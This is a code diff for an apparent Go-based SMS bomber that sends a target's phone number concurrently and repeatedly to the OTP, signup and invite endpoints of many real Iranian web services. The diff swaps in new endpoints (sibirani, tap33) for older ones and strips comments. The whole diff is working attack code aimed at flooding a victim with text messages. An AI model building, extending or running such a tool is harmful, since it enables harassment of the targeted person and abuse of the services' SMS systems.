@@ -193,42 +193,29 @@ func main() {
 
 	// Loop to send requests concurrently
 	for i := 0; i < repeatCount; i++ {
-		// --- NEW API calls with specified payloads ---
-
-		// digitalsignup.snapp.ir otp (JSON) - Corrected URL with query params and JSON payload
+		// sandbox.sibirani.ir invite (JSON)
 		wg.Add(1)
-		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
-			"cellphone": phone,
+		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// sandbox.sibirani.com generator-inv-token (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)		
+// tap33.me v2/user (JSON - adjusted payload format)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
+			"phoneNumber": phone,
 		}, &wg, ch)
 
-		// khodro45.com (JSON) - Corrected payload
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
-			"mobile": phone,
-		}, &wg, ch)
-
-		// accounts-api.tapsi.ir (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
-			"phone_number": phone,
-		}, &wg, ch)
-
-		// api.bitycle.com register (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
-			"phone": phone,
-		}, &wg, ch)
-
-		// api.nobat.ir (JSON) - Corrected payload (integer)
-		// Pass phoneInt and err to the goroutine to ensure correct scope
-		wg.Add(1) // Add unconditionally, the goroutine will check err
-		go func(pInt int, conversionErr error) { // Pass phoneInt and err as arguments
-			defer wg.Done() // Ensure Done is called by this goroutine
+		wg.Add(1) 
+		go func(pInt int, conversionErr error) { 
+			defer wg.Done() 
 			if conversionErr == nil {
-				// Note: sendJSONRequest also calls wg.Done, so we need to adjust Add/Done logic if calling it inside here.
-				// A simpler approach is to put the logic directly here.
+				
 				payload := map[string]interface{}{
-					"mobile": pInt, // Use the integer version passed as argument
+					"mobile": pInt, 
 				}
 				jsonData, marshalErr := json.Marshal(payload)
 				if marshalErr != nil {
@@ -260,13 +247,11 @@ func main() {
 				ch <- resp.StatusCode
 
 			} else {
-				// If conversion failed, report an error status or skip silently
-				// Report a specific code (e.g., 500) to indicate an internal issue with the request setup
+				
 				ch <- http.StatusInternalServerError
-				// Optionally log that this API was skipped due to conversion error
-				// fmt.Println("\033[01;33m[!] Skipping nobat.ir request due to phone number integer conversion error.\033[0m")
+			
 			}
-		}(phoneInt, err) // Pass the current values of phoneInt and err
+		}(phoneInt, err) 
 
 
 		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
